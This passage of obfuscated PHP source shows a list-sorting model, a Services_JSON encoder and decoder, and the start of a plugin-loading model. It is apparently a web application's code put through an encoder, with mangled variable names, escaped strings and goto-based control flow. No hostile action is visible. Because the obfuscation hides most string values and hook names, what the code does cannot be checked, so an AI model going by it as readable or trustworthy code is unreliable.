listData($B€∆∑ä®â· = false, $cüÛùÛ›À§ = "\x73\x6f\x72\164", $DËÖ≈Â◊ﬂê = false) { return parent::listData($B€∆∑ä®â·, $cüÛùÛ›À§, $DËÖ≈Â◊ﬂê); } public function remove($cıàÖ©ßΩá) { return parent::remove($cıàÖ©ßΩá); } public function add($c‚ä˘¥—Ê⁄, $E⁄ò√€œåÈ = "\154\x61\142\x65\x6c\x2d\147\162\x65\x79\x2d\x6e\157\x72\x6d\141\x6c") { $C√ïÔÙéŒÆ =& $_SERVER[—Ω]; if ($this->findByName($c‚ä˘¥—Ê⁄)) { return !1; } $Eåî˘öƒ»† = array($C√ïÔÙéŒÆ[383] => $c‚ä˘¥—Ê⁄, $C√ïÔÙéŒÆ[433] => $E⁄ò√€œåÈ, $C√ïÔÙéŒÆ[2084] => $this->getSort($C√ïÔÙéŒÆ[243]) + 1); return parent::insert($Eåî˘öƒ»†); } public function update($E‹ü‚Èª„÷, $e ™ÃÌπÏÙ) { $DÎ‰®»ÍŸÍ =& $_SERVER[—Ω]; $AÍ¨°®≤¶« = $this->listData($E‹ü‚Èª„÷); $a∞ö»Ë¿âÍ = $this->findByName($e ™ÃÌπÏÙ[$DÎ‰®»ÍŸÍ[28]]); if (!$AÍ¨°®≤¶« || $a∞ö»Ë¿âÍ && $a∞ö»Ë¿âÍ[$DÎ‰®»ÍŸÍ[364]] != $AÍ¨°®≤¶«[$DÎ‰®»ÍŸÍ[364]]) { return !1; } return parent::update($E‹ü‚Èª„÷, $e ™ÃÌπÏÙ); } public function moveTop($FñÙπ“Øﬂ≤) { $C≤Ÿüœèÿ£ =& $_SERVER[—Ω]; $FÓ¡¶Ü≈ÖŒ = parent::listData(); $eã‹ãñÁ≤È = $this->getSort($C≤Ÿüœèÿ£[242]); foreach ($FÓ¡¶Ü≈ÖŒ as &$aïú©ÚøâÚ) { if ($aïú©ÚøâÚ[$C≤Ÿüœèÿ£[364]] == $FñÙπ“Øﬂ≤) { $aïú©ÚøâÚ[$C≤Ÿüœèÿ£[2101]] = $eã‹ãñÁ≤È; continue; } $aïú©ÚøâÚ[$C≤Ÿüœèÿ£[2101]] += 1; } return parent::resetData($FÓ¡¶Ü≈ÖŒ); } public function moveBottom($bÇ¢ØÇ„ﬁ∞) { $c”˘±‡íåú =& $_SERVER[—Ω]; $A—É‚”Ë∂‚ = $this->getSort($c”˘±‡íåú[243]) + 1; return parent::update($bÇ¢ØÇ„ﬁ∞, array($c”˘±‡íåú[2101] => $A—É‚”Ë∂‚)); } public function resetSort($D¢¶Œºº∞Ω) { goto Fœ√ÈüÍ¬Ë; Fœ√ÈüÍ¬Ë: $c°©†∑¶Öõ =& $_SERVER[—Ω]; $Déµ…õ»¯é = array(); $D¢¶Œºº∞Ω = is_array($D¢¶Œºº∞Ω) ? $D¢¶Œºº∞Ω : array(); goto D≈Ñ›ÌÖÎë; fî≠Øó∂èÚ: return parent::resetData($d‹∑…ÁëÁã); goto d‰÷ä“åÑø; D≈Ñ›ÌÖÎë: for ($dÚèÏæ∫Ò“ = 0; $dÚèÏæ∫Ò“ < count($D¢¶Œºº∞Ω); $dÚèÏæ∫Ò“++) { $Déµ…õ»¯é[$D¢¶Œºº∞Ω[$dÚèÏæ∫Ò“] . $c°©†∑¶Öõ[33]] = $dÚèÏæ∫Ò“ + 1; } $d‹∑…ÁëÁã = parent::listData(); foreach ($d‹∑…ÁëÁã as &$eø∏ÆΩ´¢∏) { $F´ù∆≤®Í  = $Déµ…õ»¯é[$eø∏ÆΩ´¢∏[$c°©†∑¶Öõ[364]]]; $eø∏ÆΩ´¢∏[$c°©†∑¶Öõ[2101]] = $F´ù∆≤®Í  ? $F´ù∆≤®Í  : $eø∏ÆΩ´¢∏[$c°©†∑¶Öõ[2101]]; } goto fî≠Øó∂èÚ; d‰÷ä“åÑø: } private function getSort($f›èãÈÛÏã) { $cıÕ£∞¡Öè =& $_SERVER[—Ω]; $a⁄±–ò™ºß = parent::listData(); $bπ»»“ ∫£ = array_to_keyvalue($a⁄±–ò™ºß, $cıÕ£∞¡Öè[33], $cıÕ£∞¡Öè[2101]); if (!$bπ»»“ ∫£) { $bπ»»“ ∫£ = array(0); } $Cãıì€¨ûØ = $f›èãÈÛÏã == $cıÕ£∞¡Öè[243] ? max($bπ»»“ ∫£) : min($bπ»»“ ∫£); return intval($Cãıì€¨ûØ); } } goto E€÷ªÊ¨ˆê; c◊È·ÕçñÉ: define($_SERVER[—Ω][1914], 32); class Services_JSON { function __construct($AöºŸ»Í´‘ = 0) { $this->use = $AöºŸ»Í´‘; } function utf162utf8($CƒÀÊÑßåí) { $aë¯∞ï≈È– =& $_SERVER[—Ω]; if (function_exists($aë¯∞ï≈È–[68])) { return mb_convert_encoding($CƒÀÊÑßåí, $aë¯∞ï≈È–[1566], $aë¯∞ï≈È–[1915]); } $a»”ÆÈ‹¬† = ord($CƒÀÊÑßåí[0]) << 8 | ord($CƒÀÊÑßåí[1]); switch (!0) { case (127 & $a»”ÆÈ‹¬†) == $a»”ÆÈ‹¬†: return chr(127 & $a»”ÆÈ‹¬†); case (2047 & $a»”ÆÈ‹¬†) == $a»”ÆÈ‹¬†: return chr(192 | $a»”ÆÈ‹¬† >> 6 & 31) . chr(128 | $a»”ÆÈ‹¬† & 63); case (65535 & $a»”ÆÈ‹¬†) == $a»”ÆÈ‹¬†: return chr(224 | $a»”ÆÈ‹¬† >> 12 & 15) . chr(128 | $a»”ÆÈ‹¬† >> 6 & 63) . chr(128 | $a»”ÆÈ‹¬† & 63); } return $aë¯∞ï≈È–[33]; } function utf82utf16($Bç∑ÿ€ÙØª) { $bƒ∏õñ∑⁄ﬁ =& $_SERVER[—Ω]; if (function_exists($bƒ∏õñ∑⁄ﬁ[68])) { return mb_convert_encoding($Bç∑ÿ€ÙØª, $bƒ∏õñ∑⁄ﬁ[1915], $bƒ∏õñ∑⁄ﬁ[1566]); } switch (strlen($Bç∑ÿ€ÙØª)) { case 1: return $Bç∑ÿ€ÙØª; case 2: return chr(7 & ord($Bç∑ÿ€ÙØª[0]) >> 2) . chr(192 & ord($Bç∑ÿ€ÙØª[0]) << 6 | 63 & ord($Bç∑ÿ€ÙØª[1])); case 3: return chr(240 & ord($Bç∑ÿ€ÙØª[0]) << 4 | 15 & ord($Bç∑ÿ€ÙØª[1]) >> 2) . chr(192 & ord($Bç∑ÿ€ÙØª[1]) << 6 | 127 & ord($Bç∑ÿ€ÙØª[2])); } return $bƒ∏õñ∑⁄ﬁ[33]; } function encode($Cà„ù¡…≈‡) { $f≥ì≠ˆö™£ =& $_SERVER[—Ω]; switch (gettype($Cà„ù¡…≈‡)) { case $f≥ì≠ˆö™£[1577]: return $Cà„ù¡…≈‡ ? $f≥ì≠ˆö™£[1576] : $f≥ì≠ˆö™£[1578]; case $f≥ì≠ˆö™£[1916]: return $f≥ì≠ˆö™£[101]; case $f≥ì≠ˆö™£[300]: return (int) $Cà„ù¡…≈‡; case $f≥ì≠ˆö™£[275]: case $f≥ì≠ˆö™£[274]: return (double) $Cà„ù¡…≈‡; case $f≥ì≠ˆö™£[309]: $Bæ¬çøÀ“Ö = $f≥ì≠ˆö™£[33]; $Cîï‡áäƒË = strlen($Cà„ù¡…≈‡); for ($c—áµ∑«ù» = 0; $c—áµ∑«ù» < $Cîï‡áäƒË; ++$c—áµ∑«ù») { $E„Ú¬…≥è∏ = ord($Cà„ù¡…≈‡[$c—áµ∑«ù»]); switch (!0) { case $E„Ú¬…≥è∏ == 8: $Bæ¬çøÀ“Ö .= $f≥ì≠ˆö™£[1917]; break; case $E„Ú¬…≥è∏ == 9: $Bæ¬çøÀ“Ö .= $f≥ì≠ˆö™£[1553]; break; case $E„Ú¬…≥è∏ == 10: $Bæ¬çøÀ“Ö .= $f≥ì≠ˆö™£[1551]; break; case $E„Ú¬…≥è∏ == 12: $Bæ¬çøÀ“Ö .= $f≥ì≠ˆö™£[1918]; break; case $E„Ú¬…≥è∏ == 13: $Bæ¬çøÀ“Ö .= $f≥ì≠ˆö™£[1552]; break; case $E„Ú¬…≥è∏ == 34: case $E„Ú¬…≥è∏ == 47: case $E„Ú¬…≥è∏ == 92: $Bæ¬çøÀ“Ö .= $f≥ì≠ˆö™£[95] . $Cà„ù¡…≈‡[$c—áµ∑«ù»]; break; case $E„Ú¬…≥è∏ >= 32 && $E„Ú¬…≥è∏ <= 127: $Bæ¬çøÀ“Ö .= $Cà„ù¡…≈‡[$c—áµ∑«ù»]; break; case ($E„Ú¬…≥è∏ & 224) == 192: $Cª†ãäçÑ» = pack($f≥ì≠ˆö™£[1919], $E„Ú¬…≥è∏, ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 1])); $c—áµ∑«ù» += 1; $B∑é®ˆ◊ÈÍ = $this->utf82utf16($Cª†ãäçÑ»); $Bæ¬çøÀ“Ö .= sprintf($f≥ì≠ˆö™£[1920], bin2hex($B∑é®ˆ◊ÈÍ)); break; case ($E„Ú¬…≥è∏ & 240) == 224: $Cª†ãäçÑ» = pack($f≥ì≠ˆö™£[1919], $E„Ú¬…≥è∏, ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 1]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 2])); $c—áµ∑«ù» += 2; $B∑é®ˆ◊ÈÍ = $this->utf82utf16($Cª†ãäçÑ»); $Bæ¬çøÀ“Ö .= sprintf($f≥ì≠ˆö™£[1920], bin2hex($B∑é®ˆ◊ÈÍ)); break; case ($E„Ú¬…≥è∏ & 248) == 240: $Cª†ãäçÑ» = pack($f≥ì≠ˆö™£[1919], $E„Ú¬…≥è∏, ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 1]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 2]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 3])); $c—áµ∑«ù» += 3; $B∑é®ˆ◊ÈÍ = $this->utf82utf16($Cª†ãäçÑ»); $Bæ¬çøÀ“Ö .= sprintf($f≥ì≠ˆö™£[1920], bin2hex($B∑é®ˆ◊ÈÍ)); break; case ($E„Ú¬…≥è∏ & 252) == 248: $Cª†ãäçÑ» = pack($f≥ì≠ˆö™£[1919], $E„Ú¬…≥è∏, ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 1]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 2]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 3]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 4])); $c—áµ∑«ù» += 4; $B∑é®ˆ◊ÈÍ = $this->utf82utf16($Cª†ãäçÑ»); $Bæ¬çøÀ“Ö .= sprintf($f≥ì≠ˆö™£[1920], bin2hex($B∑é®ˆ◊ÈÍ)); break; case ($E„Ú¬…≥è∏ & 254) == 252: $Cª†ãäçÑ» = pack($f≥ì≠ˆö™£[1919], $E„Ú¬…≥è∏, ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 1]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 2]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 3]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 4]), ord($Cà„ù¡…≈‡[$c—áµ∑«ù» + 5])); $c—áµ∑«ù» += 5; $B∑é®ˆ◊ÈÍ = $this->utf82utf16($Cª†ãäçÑ»); $Bæ¬çøÀ“Ö .= sprintf($f≥ì≠ˆö™£[1920], bin2hex($B∑é®ˆ◊ÈÍ)); break; } } return $f≥ì≠ˆö™£[113] . $Bæ¬çøÀ“Ö . $f≥ì≠ˆö™£[113]; case $f≥ì≠ˆö™£[1921]: if (is_array($Cà„ù¡…≈‡) && count($Cà„ù¡…≈‡) && array_keys($Cà„ù¡…≈‡) !== range(0, sizeof($Cà„ù¡…≈‡) - 1)) { $cˆºÂµﬂäÛ = array_map(array($this, $f≥ì≠ˆö™£[1922]), array_keys($Cà„ù¡…≈‡), array_values($Cà„ù¡…≈‡)); foreach ($cˆºÂµﬂäÛ as $aÌ∞¿ı‚ã) { if (Services_JSON::isError($aÌ∞¿ı‚ã)) { return $aÌ∞¿ı‚ã; } } return $f≥ì≠ˆö™£[1072] . join($f≥ì≠ˆö™£[47], $cˆºÂµﬂäÛ) . $f≥ì≠ˆö™£[312]; } $C ·∏¥ÍÜï = array_map(array($this, $f≥ì≠ˆö™£[1923]), $Cà„ù¡…≈‡); foreach ($C ·∏¥ÍÜï as $E¥Ç∂ûÌ◊‹) { if (Services_JSON::isError($E¥Ç∂ûÌ◊‹)) { return $E¥Ç∂ûÌ◊‹; } } return $f≥ì≠ˆö™£[154] . join($f≥ì≠ˆö™£[47], $C ·∏¥ÍÜï) . $f≥ì≠ˆö™£[472]; case $f≥ì≠ˆö™£[1924]: $fãåÍéÂÌ£ = get_object_vars($Cà„ù¡…≈‡); $cˆºÂµﬂäÛ = array_map(array($this, $f≥ì≠ˆö™£[1922]), array_keys($fãåÍéÂÌ£), array_values($fãåÍéÂÌ£)); foreach ($cˆºÂµﬂäÛ as $aÌ∞¿ı‚ã) { if (Services_JSON::isError($aÌ∞¿ı‚ã)) { return $aÌ∞¿ı‚ã; } } return $f≥ì≠ˆö™£[1072] . join($f≥ì≠ˆö™£[47], $cˆºÂµﬂäÛ) . $f≥ì≠ˆö™£[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $f≥ì≠ˆö™£[101] : new Services_JSON_Error(gettype($Cà„ù¡…≈‡) . $f≥ì≠ˆö™£[1925]); } } function name_value($FÜù´ÑÈéÈ, $FÙ√›ÕÉ¡Ü) { $FÌ¬ëÃ∑çë = $this->encode($FÙ√›ÕÉ¡Ü); if (Services_JSON::isError($FÌ¬ëÃ∑çë)) { return $FÌ¬ëÃ∑çë; } return $this->encode(strval($FÜù´ÑÈéÈ)) . $_SERVER[—Ω][4] . $FÌ¬ëÃ∑çë; } function reduce_string($Dª¯ñ…¥œﬂ) { $eﬂ´Ô∞Ì’ =& $_SERVER[—Ω]; $Dª¯ñ…¥œﬂ = preg_replace(array($eﬂ´Ô∞Ì’[1926], $eﬂ´Ô∞Ì’[1927], $eﬂ´Ô∞Ì’[1928]), $eﬂ´Ô∞Ì’[33], $Dª¯ñ…¥œﬂ); return trim($Dª¯ñ…¥œﬂ); } function decode($bô˘‡À∂ÁÜ) { $D¢¨Ê£⁄´ª =& $_SERVER[—Ω]; $bô˘‡À∂ÁÜ = $this->reduce_string($bô˘‡À∂ÁÜ); switch (strtolower($bô˘‡À∂ÁÜ)) { case $D¢¨Ê£⁄´ª[1576]: return !0; case $D¢¨Ê£⁄´ª[1578]: return !1; case $D¢¨Ê£⁄´ª[101]: return null; default: $cú›¢‰ôäÔ = array(); if (is_numeric($bô˘‡À∂ÁÜ)) { return (double) $bô˘‡À∂ÁÜ == (int) $bô˘‡À∂ÁÜ ? (int) $bô˘‡À∂ÁÜ : (double) $bô˘‡À∂ÁÜ; } elseif (preg_match($D¢¨Ê£⁄´ª[1929], $bô˘‡À∂ÁÜ, $cú›¢‰ôäÔ) && $cú›¢‰ôäÔ[1] == $cú›¢‰ôäÔ[2]) { $bü•„¯¬£Ñ = substr($bô˘‡À∂ÁÜ, 0, 1); $eÀ†ªÎñ¡ñ = substr($bô˘‡À∂ÁÜ, 1, -1); $fÌ√ÇŸàãé = $D¢¨Ê£⁄´ª[33]; $bó‚¬öùéÑ = strlen($eÀ†ªÎñ¡ñ); for ($EØËû•ºù¥ = 0; $EØËû•ºù¥ < $bó‚¬öùéÑ; ++$EØËû•ºù¥) { $Bå‚”˜∂à§ = substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 2); $D¶Ûê´ó›∫ = ord($eÀ†ªÎñ¡ñ[$EØËû•ºù¥]); switch (!0) { case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1917]: $fÌ√ÇŸàãé .= chr(8); ++$EØËû•ºù¥; break; case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1553]: $fÌ√ÇŸàãé .= chr(9); ++$EØËû•ºù¥; break; case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1551]: $fÌ√ÇŸàãé .= chr(10); ++$EØËû•ºù¥; break; case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1918]: $fÌ√ÇŸàãé .= chr(12); ++$EØËû•ºù¥; break; case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1552]: $fÌ√ÇŸàãé .= chr(13); ++$EØËû•ºù¥; break; case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1337]: case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1930]: case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1546]: case $Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1548]: if ($bü•„¯¬£Ñ == $D¢¨Ê£⁄´ª[113] && $Bå‚”˜∂à§ != $D¢¨Ê£⁄´ª[1930] || $bü•„¯¬£Ñ == $D¢¨Ê£⁄´ª[55] && $Bå‚”˜∂à§ != $D¢¨Ê£⁄´ª[1337]) { $fÌ√ÇŸàãé .= $eÀ†ªÎñ¡ñ[++$EØËû•ºù¥]; } break; case preg_match($D¢¨Ê£⁄´ª[1931], substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 6)): $d⁄îÑƒ◊≈ì = chr(hexdec(substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥ + 2, 2))) . chr(hexdec(substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥ + 4, 2))); $fÌ√ÇŸàãé .= $this->utf162utf8($d⁄îÑƒ◊≈ì); $EØËû•ºù¥ += 5; break; case $D¶Ûê´ó›∫ >= 32 && $D¶Ûê´ó›∫ <= 127: $fÌ√ÇŸàãé .= $eÀ†ªÎñ¡ñ[$EØËû•ºù¥]; break; case ($D¶Ûê´ó›∫ & 224) == 192: $fÌ√ÇŸàãé .= substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 2); ++$EØËû•ºù¥; break; case ($D¶Ûê´ó›∫ & 240) == 224: $fÌ√ÇŸàãé .= substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 3); $EØËû•ºù¥ += 2; break; case ($D¶Ûê´ó›∫ & 248) == 240: $fÌ√ÇŸàãé .= substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 4); $EØËû•ºù¥ += 3; break; case ($D¶Ûê´ó›∫ & 252) == 248: $fÌ√ÇŸàãé .= substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 5); $EØËû•ºù¥ += 4; break; case ($D¶Ûê´ó›∫ & 254) == 252: $fÌ√ÇŸàãé .= substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 6); $EØËû•ºù¥ += 5; break; } } return $fÌ√ÇŸàãé; } elseif (preg_match($D¢¨Ê£⁄´ª[1932], $bô˘‡À∂ÁÜ) || preg_match($D¢¨Ê£⁄´ª[1933], $bô˘‡À∂ÁÜ)) { goto DºŸ≤ÈΩıÛ; DºŸ≤ÈΩıÛ: if ($bô˘‡À∂ÁÜ[0] == $D¢¨Ê£⁄´ª[154]) { $E·Ÿâ“†Âú = array(SERVICES_JSON_IN_ARR); $bêﬂﬂÂ·›¥ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E·Ÿâ“†Âú = array(SERVICES_JSON_IN_OBJ); $B¯ÒÌ‹˘íæ = array(); } else { $E·Ÿâ“†Âú = array(SERVICES_JSON_IN_OBJ); $B¯ÒÌ‹˘íæ = new stdClass(); } } array_push($E·Ÿâ“†Âú, array($D¢¨Ê£⁄´ª[1934] => SERVICES_JSON_SLICE, $D¢¨Ê£⁄´ª[260] => 0, $D¢¨Ê£⁄´ª[1935] => !1)); $eÀ†ªÎñ¡ñ = substr($bô˘‡À∂ÁÜ, 1, -1); goto d êÍ’∆çä; d êÍ’∆çä: $eÀ†ªÎñ¡ñ = $this->reduce_string($eÀ†ªÎñ¡ñ); if ($eÀ†ªÎñ¡ñ == $D¢¨Ê£⁄´ª[33]) { if (reset($E·Ÿâ“†Âú) == SERVICES_JSON_IN_ARR) { return $bêﬂﬂÂ·›¥; } else { return $B¯ÒÌ‹˘íæ; } } $bó‚¬öùéÑ = strlen($eÀ†ªÎñ¡ñ); goto c«™øÒÒÓΩ; c«™øÒÒÓΩ: for ($EØËû•ºù¥ = 0; $EØËû•ºù¥ <= $bó‚¬öùéÑ; ++$EØËû•ºù¥) { $c⁄◊í≈ºÈ– = end($E·Ÿâ“†Âú); $Bå‚”˜∂à§ = substr($eÀ†ªÎñ¡ñ, $EØËû•ºù¥, 2); if ($EØËû•ºù¥ == $bó‚¬öùéÑ || $eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $D¢¨Ê£⁄´ª[47] && $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]] == SERVICES_JSON_SLICE) { $däî·èÑêﬁ = substr($eÀ†ªÎñ¡ñ, $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[260]], $EØËû•ºù¥ - $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[260]]); array_push($E·Ÿâ“†Âú, array($D¢¨Ê£⁄´ª[1934] => SERVICES_JSON_SLICE, $D¢¨Ê£⁄´ª[260] => $EØËû•ºù¥ + 1, $D¢¨Ê£⁄´ª[1935] => !1)); if (reset($E·Ÿâ“†Âú) == SERVICES_JSON_IN_ARR) { array_push($bêﬂﬂÂ·›¥, $this->decode($däî·èÑêﬁ)); } elseif (reset($E·Ÿâ“†Âú) == SERVICES_JSON_IN_OBJ) { $E—÷«ËïÀ∞ = array(); if (preg_match($D¢¨Ê£⁄´ª[1936], $däî·èÑêﬁ, $E—÷«ËïÀ∞)) { $d±òﬁà´ÕÜ = $this->decode($E—÷«ËïÀ∞[1]); $cÉ‘…∂¯ô› = $this->decode($E—÷«ËïÀ∞[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $B¯ÒÌ‹˘íæ[$d±òﬁà´ÕÜ] = $cÉ‘…∂¯ô›; } else { $B¯ÒÌ‹˘íæ->{$d±òﬁà´ÕÜ} = $cÉ‘…∂¯ô›; } } elseif (preg_match($D¢¨Ê£⁄´ª[1937], $däî·èÑêﬁ, $E—÷«ËïÀ∞)) { $d±òﬁà´ÕÜ = $E—÷«ËïÀ∞[1]; $cÉ‘…∂¯ô› = $this->decode($E—÷«ËïÀ∞[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $B¯ÒÌ‹˘íæ[$d±òﬁà´ÕÜ] = $cÉ‘…∂¯ô›; } else { $B¯ÒÌ‹˘íæ->{$d±òﬁà´ÕÜ} = $cÉ‘…∂¯ô›; } } } } elseif (($eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $D¢¨Ê£⁄´ª[113] || $eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $D¢¨Ê£⁄´ª[55]) && $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]] != SERVICES_JSON_IN_STR) { array_push($E·Ÿâ“†Âú, array($D¢¨Ê£⁄´ª[1934] => SERVICES_JSON_IN_STR, $D¢¨Ê£⁄´ª[260] => $EØËû•ºù¥, $D¢¨Ê£⁄´ª[1935] => $eÀ†ªÎñ¡ñ[$EØËû•ºù¥])); } elseif ($eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1935]] && $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]] == SERVICES_JSON_IN_STR && (strlen(substr($eÀ†ªÎñ¡ñ, 0, $EØËû•ºù¥)) - strlen(rtrim(substr($eÀ†ªÎñ¡ñ, 0, $EØËû•ºù¥), $D¢¨Ê£⁄´ª[95]))) % 2 != 1) { array_pop($E·Ÿâ“†Âú); } elseif ($eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $D¢¨Ê£⁄´ª[154] && in_array($c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E·Ÿâ“†Âú, array($D¢¨Ê£⁄´ª[1934] => SERVICES_JSON_IN_ARR, $D¢¨Ê£⁄´ª[260] => $EØËû•ºù¥, $D¢¨Ê£⁄´ª[1935] => !1)); } elseif ($eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $D¢¨Ê£⁄´ª[472] && $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]] == SERVICES_JSON_IN_ARR) { array_pop($E·Ÿâ“†Âú); } elseif ($eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $D¢¨Ê£⁄´ª[1072] && in_array($c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E·Ÿâ“†Âú, array($D¢¨Ê£⁄´ª[1934] => SERVICES_JSON_IN_OBJ, $D¢¨Ê£⁄´ª[260] => $EØËû•ºù¥, $D¢¨Ê£⁄´ª[1935] => !1)); } elseif ($eÀ†ªÎñ¡ñ[$EØËû•ºù¥] == $D¢¨Ê£⁄´ª[312] && $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]] == SERVICES_JSON_IN_OBJ) { array_pop($E·Ÿâ“†Âú); } elseif ($Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1938] && in_array($c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E·Ÿâ“†Âú, array($D¢¨Ê£⁄´ª[1934] => SERVICES_JSON_IN_CMT, $D¢¨Ê£⁄´ª[260] => $EØËû•ºù¥, $D¢¨Ê£⁄´ª[1935] => !1)); $EØËû•ºù¥++; } elseif ($Bå‚”˜∂à§ == $D¢¨Ê£⁄´ª[1939] && $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[1934]] == SERVICES_JSON_IN_CMT) { array_pop($E·Ÿâ“†Âú); $EØËû•ºù¥++; for ($cì·—£–’è = $c⁄◊í≈ºÈ–[$D¢¨Ê£⁄´ª[260]]; $cì·—£–’è <= $EØËû•ºù¥; ++$cì·—£–’è) { $eÀ†ªÎñ¡ñ = substr_replace($eÀ†ªÎñ¡ñ, $D¢¨Ê£⁄´ª[50], $cì·—£–’è, 1); } } } if (reset($E·Ÿâ“†Âú) == SERVICES_JSON_IN_ARR) { return $bêﬂﬂÂ·›¥; } elseif (reset($E·Ÿâ“†Âú) == SERVICES_JSON_IN_OBJ) { return $B¯ÒÌ‹˘íæ; } goto CáŒíúÉ±Ó; CáŒíúÉ±Ó: } } } function isError($B∑∆Ö°¯Î§, $Cîˆ‘ê†‰ï = null) { $DÜ≠‘®“≈è =& $_SERVER[—Ω]; if (class_exists($DÜ≠‘®“≈è[1940])) { return PEAR::isError($B∑∆Ö°¯Î§, $Cîˆ‘ê†‰ï); } elseif (is_object($B∑∆Ö°¯Î§) && (get_class($B∑∆Ö°¯Î§) == $DÜ≠‘®“≈è[1941] || is_subclass_of($B∑∆Ö°¯Î§, $DÜ≠‘®“≈è[1941]))) { return !0; } return !1; } } if (class_exists($_SERVER[—Ω][1942])) { class Services_JSON_Error extends PEAR_Error { function __construct($C√¬ê‚Ñµı = "\x75\156\153\156\x6f\x77\156\x20\145\x72\162\157\x72", $A∂÷ù≥©¥¿ = null, $eÉŸÇ¨Ùﬁ• = null, $a‘–È˘©ô  = null, $FúÇé“˘Ò√ = null) { parent::PEAR_Error($C√¬ê‚Ñµı, $A∂÷ù≥©¥¿, $eÉŸÇ¨Ùﬁ•, $a‘–È˘©ô , $FúÇé“˘Ò√); } } } else { class Services_JSON_Error { function __construct($Bé¬øÕêë§ = "\x75\156\153\x6e\x6f\x77\x6e\40\145\x72\162\157\x72", $e≈ œÀ≥Çå = null, $bûì‰áœòç = null, $AËÈáçÕ≠ï = null, $CÂ€ÀÊëü€ = null) { } } } goto aç‰ù˘√Ôÿ; dÚÿéáµ≤∂: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\160\x6c\x75\147\151\156\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x73\x74\141\x74\165\x73", "\162\x65\x67\x69\145\x73\x74", "\143\x6f\156\x66\x69\x67"); public function loadList($D÷∑ÏÆÂÏ“ = false) { $BóüˆŒ◊•• = array_to_keyvalue($this->listData(), $_SERVER[—Ω][28]); if ($D÷∑ÏÆÂÏ“) { return $BóüˆŒ◊••[$D÷∑ÏÆÂÏ“]; } return $BóüˆŒ◊••; } public function init() { $Cåù»ÔºÖÇ =& $_SERVER[—Ω]; Hook::trigger($Cåù»ÔºÖÇ[2168]); $CéÆ‡çßŒ¶ = $this->loadPluginList(); foreach ($CéÆ‡çßŒ¶ as $eÁµ’‹Ãôı => $B¥ÃÚ¨ú√¯) { $Cã…Áä†Î≠ = $this->appAllow($eÁµ’‹Ãôı, $B¥ÃÚ¨ú√¯); if (!$Cã…Áä†Î≠) { continue; } foreach ($B¥ÃÚ¨ú√¯[$Cåù»ÔºÖÇ[2169]] as $C®‰˘¡§Â« => $b¢·–¥ÑÁÚ) { Hook::bind($C®‰˘¡§Â«, $b¢·–¥ÑÁÚ); } } Hook::trigger($Cåù»ÔºÖÇ[2170]); Hook::trigger(ACTION); } public function appAllow($D∏Ì·ãßäÖ, $B¡å«„å‰†, $Aúß¨ÎÛµ¿ = true) { $f≥÷»æﬂı =& $_SERVER[—Ω]; $B‚ïçêﬂï— = PLUGIN_DIR . $D∏Ì·ãßäÖ . 